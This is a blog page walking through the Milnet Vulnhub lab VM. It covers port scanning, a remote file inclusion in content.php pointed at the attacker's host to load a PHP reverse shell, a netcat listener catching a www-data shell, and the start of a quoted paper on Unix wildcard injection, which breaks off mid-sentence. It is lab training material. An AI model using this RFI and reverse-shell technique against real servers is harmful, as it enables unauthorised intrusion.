
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Hacking the Milnet - Core dump overflow</title>
  <meta name="author" content="chousensha">

  
  
  <meta name="description" content="Milnet writeup">
  <meta name="keywords" content="milnet, milnet 1, milnet vulnhub, vulnhub, pentest lab, hacking lab, ctf">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://chousensha.github.io/blog/2018/05/13/hacking-the-milnet">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-51216602-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Core dump overflow</a></h1>
  
    <h2>Core dump in progress...</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:chousensha.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/where-to-start">Where to start</a></li>
  <li><a href="/book-corner">Book corner</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Hacking the Milnet</h1>
    
    
      <p class="meta">
        








  


<time datetime="2018-05-13T06:55:41-04:00" pubdate data-updated="true">May 13<span>th</span>, 2018</time>
        
           | <a href="#disqus_thread"
             data-disqus-identifier="http://chousensha.github.io">Comments</a>
        
      </p>
    
  </header>


<div class="entry-content"><p>Today&rsquo;s target is a story-based VM inspired by a book! Let&rsquo;s jump straight in!</p>

<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   2048 9b:b5:21:38:96:7f:85:bd:1b:aa:9a:70:cf:db:cd:36 (RSA)
</span><span class='line'>|   256 93:30:be:c2:af:dd:81:a8:25:2b:57:e5:01:49:91:57 (ECDSA)
</span><span class='line'>|_  256 37:40:2b:cc:27:ae:89:22:d0:d2:65:65:c4:9b:53:42 (EdDSA)
</span><span class='line'>80/tcp open  http    lighttpd 1.4.35
</span><span class='line'>|_http-server-header: lighttpd/1.4.35
</span><span class='line'>|_http-title: Site doesn't have a title (text/html; charset=UTF-8).</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="/images/pentest/milnet/milnet.jpg" title="milnet" alt="milnet"></p>

<p>Nothing much on this site, some German text and a credits page. I ran Nikto on it with no significant finds. The site is running lighttpd/1.4.35 and it has an info.php page displaying phpinfo() output. There is also a line mentioning a RFI vulnerability for the info.php page, but I wasn&rsquo;t able to exploit that.</p>

<p>I ran dirb next, with no further luck. So I looked more closely at the phpinfo page. The allow_url_include directive is on, so RFI should definitely be possible somewhere, but I couldn&rsquo;t find extra pages. I tried OWASP ZAP next, and it helped with finding the vulnerable entry point:</p>

<p><img class="center" src="/images/pentest/milnet/zap.jpg" title="owasp zap rfi" alt="owasp zap rfi"></p>

<p>I used Burp to craft a request directly to the content.php page, by trying to direct the route parameter to a page on my machine where the Python web server would serve a reverse shell, but it didn&rsquo;t work, so I took a step back to see how the website is using the route parameter. I just navigated on it with Burp on and observed the request:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /content.php HTTP/1.1
</span><span class='line'>Host: 192.168.217.140
</span><span class='line'>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>Referer: http://192.168.217.140/nav.php
</span><span class='line'>DNT: 1
</span><span class='line'>Connection: close
</span><span class='line'>Upgrade-Insecure-Requests: 1
</span><span class='line'>Content-Type: application/x-www-form-urlencoded
</span><span class='line'>Content-Length: 10
</span><span class='line'>
</span><span class='line'>route=bomb</span></code></pre></td></tr></table></div></figure>


<p>So I intercepted this and changed route to point to <a href="http://192.168.217.132:8000/shell.php.">http://192.168.217.132:8000/shell.php.</a> This is my attacking machine where I was serving the shell on port 8000 and waiting for it on port 8888. This time I did get an incoming request:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -m SimpleHTTPServer 8000
</span><span class='line'>Serving HTTP on 0.0.0.0 port 8000 ...
</span><span class='line'>192.168.217.140 - - [13/May/2018 08:16:54] code 404, message File not found
</span><span class='line'>192.168.217.140 - - [13/May/2018 08:16:54] "GET /shell.php.php HTTP/1.0" 404 -</span></code></pre></td></tr></table></div></figure>


<p>An extra .php extension is appended to the request. So I changed the RFI to:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>route=http://192.168.217.132:8000/shell</span></code></pre></td></tr></table></div></figure>


<p>And this time things went smoothly:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.217.140 - - [13/May/2018 08:29:41] "GET /shell.php HTTP/1.0" 200 -</span></code></pre></td></tr></table></div></figure>


<p>I have a shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.140] 57412
</span><span class='line'>Linux seckenheim.net.mil 4.4.0-22-generic #40-Ubuntu SMP Thu May 12 22:03:46 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
</span><span class='line'> 14:29:41 up  1:38,  0 users,  load average: 0.13, 0.07, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
</span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>


<p>I proceeded with some enumeration:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls /home
</span><span class='line'>langman
</span><span class='line'>$ ls /home/langman
</span><span class='line'>SDINET</span></code></pre></td></tr></table></div></figure>


<p>There are lots of text files in here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls
</span><span class='line'>DCA_Circular.310-P115-1
</span><span class='line'>DefenseCode_Unix_WildCards_Gone_Wild.txt
</span><span class='line'>FUN18.TXT
</span><span class='line'>compserv.txt
</span><span class='line'>fips-index.
</span><span class='line'>fips_500_166.txt
</span><span class='line'>fips_500_169.txt
</span><span class='line'>fips_500_170.txt
</span><span class='line'>fips_500_171.txt
</span><span class='line'>pentagon.txt
</span><span class='line'>sec-8901.txt
</span><span class='line'>sec-8902.txt
</span><span class='line'>sec-9540.txt
</span><span class='line'>sec-9720.txt</span></code></pre></td></tr></table></div></figure>


<p>These are various army-related documents which you can read at your own leisure. More interesting is the DefenseCode_Unix_WildCards_Gone_Wild.txt document, which lists different code execution techniques by exploiting Unix wildcards. Because this was such an interesting read, I&rsquo;ve included it here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
<span class='line-number'>264</span>
<span class='line-number'>265</span>
<span class='line-number'>266</span>
<span class='line-number'>267</span>
<span class='line-number'>268</span>
<span class='line-number'>269</span>
<span class='line-number'>270</span>
<span class='line-number'>271</span>
<span class='line-number'>272</span>
<span class='line-number'>273</span>
<span class='line-number'>274</span>
<span class='line-number'>275</span>
<span class='line-number'>276</span>
<span class='line-number'>277</span>
<span class='line-number'>278</span>
<span class='line-number'>279</span>
<span class='line-number'>280</span>
<span class='line-number'>281</span>
<span class='line-number'>282</span>
<span class='line-number'>283</span>
<span class='line-number'>284</span>
<span class='line-number'>285</span>
<span class='line-number'>286</span>
<span class='line-number'>287</span>
<span class='line-number'>288</span>
<span class='line-number'>289</span>
<span class='line-number'>290</span>
<span class='line-number'>291</span>
<span class='line-number'>292</span>
<span class='line-number'>293</span>
<span class='line-number'>294</span>
<span class='line-number'>295</span>
<span class='line-number'>296</span>
<span class='line-number'>297</span>
<span class='line-number'>298</span>
<span class='line-number'>299</span>
<span class='line-number'>300</span>
<span class='line-number'>301</span>
<span class='line-number'>302</span>
<span class='line-number'>303</span>
<span class='line-number'>304</span>
<span class='line-number'>305</span>
<span class='line-number'>306</span>
<span class='line-number'>307</span>
<span class='line-number'>308</span>
<span class='line-number'>309</span>
<span class='line-number'>310</span>
<span class='line-number'>311</span>
<span class='line-number'>312</span>
<span class='line-number'>313</span>
<span class='line-number'>314</span>
<span class='line-number'>315</span>
<span class='line-number'>316</span>
<span class='line-number'>317</span>
<span class='line-number'>318</span>
<span class='line-number'>319</span>
<span class='line-number'>320</span>
<span class='line-number'>321</span>
<span class='line-number'>322</span>
<span class='line-number'>323</span>
<span class='line-number'>324</span>
<span class='line-number'>325</span>
<span class='line-number'>326</span>
<span class='line-number'>327</span>
<span class='line-number'>328</span>
<span class='line-number'>329</span>
<span class='line-number'>330</span>
<span class='line-number'>331</span>
<span class='line-number'>332</span>
<span class='line-number'>333</span>
<span class='line-number'>334</span>
<span class='line-number'>335</span>
<span class='line-number'>336</span>
<span class='line-number'>337</span>
<span class='line-number'>338</span>
<span class='line-number'>339</span>
<span class='line-number'>340</span>
<span class='line-number'>341</span>
<span class='line-number'>342</span>
<span class='line-number'>343</span>
<span class='line-number'>344</span>
<span class='line-number'>345</span>
<span class='line-number'>346</span>
<span class='line-number'>347</span>
<span class='line-number'>348</span>
<span class='line-number'>349</span>
<span class='line-number'>350</span>
<span class='line-number'>351</span>
<span class='line-number'>352</span>
<span class='line-number'>353</span>
<span class='line-number'>354</span>
<span class='line-number'>355</span>
<span class='line-number'>356</span>
<span class='line-number'>357</span>
<span class='line-number'>358</span>
<span class='line-number'>359</span>
<span class='line-number'>360</span>
<span class='line-number'>361</span>
<span class='line-number'>362</span>
<span class='line-number'>363</span>
<span class='line-number'>364</span>
<span class='line-number'>365</span>
<span class='line-number'>366</span>
<span class='line-number'>367</span>
<span class='line-number'>368</span>
<span class='line-number'>369</span>
<span class='line-number'>370</span>
<span class='line-number'>371</span>
<span class='line-number'>372</span>
<span class='line-number'>373</span>
<span class='line-number'>374</span>
<span class='line-number'>375</span>
<span class='line-number'>376</span>
<span class='line-number'>377</span>
<span class='line-number'>378</span>
<span class='line-number'>379</span>
<span class='line-number'>380</span>
<span class='line-number'>381</span>
<span class='line-number'>382</span>
<span class='line-number'>383</span>
<span class='line-number'>384</span>
<span class='line-number'>385</span>
<span class='line-number'>386</span>
<span class='line-number'>387</span>
<span class='line-number'>388</span>
<span class='line-number'>389</span>
<span class='line-number'>390</span>
<span class='line-number'>391</span>
<span class='line-number'>392</span>
<span class='line-number'>393</span>
<span class='line-number'>394</span>
<span class='line-number'>395</span>
<span class='line-number'>396</span>
<span class='line-number'>397</span>
<span class='line-number'>398</span>
<span class='line-number'>399</span>
<span class='line-number'>400</span>
<span class='line-number'>401</span>
<span class='line-number'>402</span>
<span class='line-number'>403</span>
<span class='line-number'>404</span>
<span class='line-number'>405</span>
<span class='line-number'>406</span>
<span class='line-number'>407</span>
<span class='line-number'>408</span>
<span class='line-number'>409</span>
<span class='line-number'>410</span>
<span class='line-number'>411</span>
<span class='line-number'>412</span>
<span class='line-number'>413</span>
<span class='line-number'>414</span>
<span class='line-number'>415</span>
<span class='line-number'>416</span>
<span class='line-number'>417</span>
<span class='line-number'>418</span>
<span class='line-number'>419</span>
<span class='line-number'>420</span>
<span class='line-number'>421</span>
<span class='line-number'>422</span>
<span class='line-number'>423</span>
<span class='line-number'>424</span>
<span class='line-number'>425</span>
<span class='line-number'>426</span>
<span class='line-number'>427</span>
<span class='line-number'>428</span>
<span class='line-number'>429</span>
<span class='line-number'>430</span>
<span class='line-number'>431</span>
<span class='line-number'>432</span>
<span class='line-number'>433</span>
<span class='line-number'>434</span>
<span class='line-number'>435</span>
<span class='line-number'>436</span>
<span class='line-number'>437</span>
<span class='line-number'>438</span>
<span class='line-number'>439</span>
<span class='line-number'>440</span>
<span class='line-number'>441</span>
<span class='line-number'>442</span>
<span class='line-number'>443</span>
<span class='line-number'>444</span>
<span class='line-number'>445</span>
<span class='line-number'>446</span>
<span class='line-number'>447</span>
<span class='line-number'>448</span>
<span class='line-number'>449</span>
<span class='line-number'>450</span>
<span class='line-number'>451</span>
<span class='line-number'>452</span>
<span class='line-number'>453</span>
<span class='line-number'>454</span>
<span class='line-number'>455</span>
<span class='line-number'>456</span>
<span class='line-number'>457</span>
<span class='line-number'>458</span>
<span class='line-number'>459</span>
<span class='line-number'>460</span>
<span class='line-number'>461</span>
<span class='line-number'>462</span>
<span class='line-number'>463</span>
<span class='line-number'>464</span>
<span class='line-number'>465</span>
<span class='line-number'>466</span>
<span class='line-number'>467</span>
<span class='line-number'>468</span>
<span class='line-number'>469</span>
<span class='line-number'>470</span>
<span class='line-number'>471</span>
<span class='line-number'>472</span>
<span class='line-number'>473</span>
<span class='line-number'>474</span>
<span class='line-number'>475</span>
<span class='line-number'>476</span>
<span class='line-number'>477</span>
<span class='line-number'>478</span>
<span class='line-number'>479</span>
<span class='line-number'>480</span>
<span class='line-number'>481</span>
<span class='line-number'>482</span>
<span class='line-number'>483</span>
<span class='line-number'>484</span>
<span class='line-number'>485</span>
<span class='line-number'>486</span>
<span class='line-number'>487</span>
<span class='line-number'>488</span>
<span class='line-number'>489</span>
<span class='line-number'>490</span>
<span class='line-number'>491</span>
<span class='line-number'>492</span>
<span class='line-number'>493</span>
<span class='line-number'>494</span>
<span class='line-number'>495</span>
<span class='line-number'>496</span>
<span class='line-number'>497</span>
<span class='line-number'>498</span>
<span class='line-number'>499</span>
<span class='line-number'>500</span>
<span class='line-number'>501</span>
<span class='line-number'>502</span>
<span class='line-number'>503</span>
<span class='line-number'>504</span>
<span class='line-number'>505</span>
<span class='line-number'>506</span>
<span class='line-number'>507</span>
<span class='line-number'>508</span>
<span class='line-number'>509</span>
<span class='line-number'>510</span>
<span class='line-number'>511</span>
<span class='line-number'>512</span>
<span class='line-number'>513</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Back To The Future: Unix Wildcards Gone Wild
</span><span class='line'>============================================
</span><span class='line'>- Leon Juranic &lt;leon@defensecode.com&gt; 
</span><span class='line'>- Creation Date: 04/20/2013
</span><span class='line'>- Release Date: 06/25/2014
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Table Of Content:
</span><span class='line'>
</span><span class='line'>===[ 1. Introduction
</span><span class='line'>===[ 2. Unix Wildcards For Dummies
</span><span class='line'>===[ 3. Wildcard Wilderness
</span><span class='line'>===[ 4. Something more useful...
</span><span class='line'>      4.1 Chown file reference trick (file owner hijacking)
</span><span class='line'>      4.2 Chmod file reference trick
</span><span class='line'>      4.3 Tar arbitrary command execution 
</span><span class='line'>      4.4 Rsync arbitrary command execution
</span><span class='line'>===[ 5. Conclusion
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>===[ 1. Introduction
</span><span class='line'>
</span><span class='line'>First of all, this article has nothing to do with modern hacking
</span><span class='line'>techniques like ASLR bypass, ROP exploits, 0day remote kernel exploits or Chrome's
</span><span class='line'>Chain-14-Different-Bugs-To-Get-There... 
</span><span class='line'>Nope, nothing of the above. This article will cover one interesting
</span><span class='line'>old-school Unix hacking technique, that will still work nowadays in 2013.
</span><span class='line'>Hacking technique of which (to my suprise) even many security-related people haven't heard of. 
</span><span class='line'>That is probably because nobody ever really talked about it before.
</span><span class='line'>Why I decided to write on this subject is because, to me personally, it's pretty funny 
</span><span class='line'>to see what can be done with simple Unix wildcard poisoning tricks.
</span><span class='line'>So, from this article, what you can expect is collection of neat *nix hacking
</span><span class='line'>tricks that as far as I know somehow didn't emerge earlier. 
</span><span class='line'>If you wonder how basic Unix tools like 'tar' or 'chown' can lead to
</span><span class='line'>full system compromise, keep on reading.
</span><span class='line'>Ladies and gentleman; take your seats, fasten your belts and hold on tight
</span><span class='line'>- cause we're going straight back to the 80's, right to the Unix shell hacking... 
</span><span class='line'>(Is this bad-hair-rock/groovy disco music playing in the background? I think sooo...)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>===[ 2. Unix Wildcards For Dummies
</span><span class='line'>
</span><span class='line'>If you already know what Unix wildcards are, and how (and why) are they 
</span><span class='line'>used in shell scripting, you should skip this part.
</span><span class='line'>However, we will include Wildcard definition here just for the sake of
</span><span class='line'>consistency and for potential newcomers.
</span><span class='line'>Wildcard is a character, or set of characters that can be used as a
</span><span class='line'>replacement for some range/class of characters. Wildcards are interpreted 
</span><span class='line'>by shell before any other action is taken.
</span><span class='line'>
</span><span class='line'>Some Shell Wildcards:
</span><span class='line'>
</span><span class='line'>    *     An asterisk matches any number of characters
</span><span class='line'>          in a filename, including none.
</span><span class='line'>    ?     The question mark matches any single
</span><span class='line'>          character.
</span><span class='line'>    [ ]   Brackets enclose a set of characters, any
</span><span class='line'>          one of which may match a single character
</span><span class='line'>          at that position.
</span><span class='line'>    -     A hyphen used within [ ] denotes a range of
</span><span class='line'>          characters.
</span><span class='line'>    ~     A tilde at the beginning of a word expands
</span><span class='line'>          to the name of your home directory.  If you
</span><span class='line'>          append another user's login name to the
</span><span class='line'>          character, it refers to that user's home
</span><span class='line'>          directory.
</span><span class='line'>
</span><span class='line'>Basic example of wildcards usage:
</span><span class='line'>
</span><span class='line'># ls *.php
</span><span class='line'>- List all files with PHP extension
</span><span class='line'>
</span><span class='line'># rm *.gz
</span><span class='line'>- Delete all GZIP files
</span><span class='line'>
</span><span class='line'># cat backup*
</span><span class='line'>- Show content of all files which name is beginning with 'backup' string
</span><span class='line'>
</span><span class='line'># ls test?
</span><span class='line'>- List all files whose name is beginning with string 'test' and has exactly
</span><span class='line'>  one additional character
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>===[ 3. Wildcard Wilderness
</span><span class='line'>
</span><span class='line'>Wildcards as their name states, are "wild" by their nature, but moreover, 
</span><span class='line'>in some cases, wildcards can go berserk.
</span><span class='line'>During the initial phase of playing with this interesting wildcard tricks,
</span><span class='line'>I've talked with dozen old-school Unix admins and security people,
</span><span class='line'>just to find out how many of them knows about wildcard tricks, and
</span><span class='line'>potential danger that they pose.
</span><span class='line'>To my suprise, only two of 20 people stated that they know it's not 
</span><span class='line'>wise to use wildcard, particulary in 'rm' command, because someone
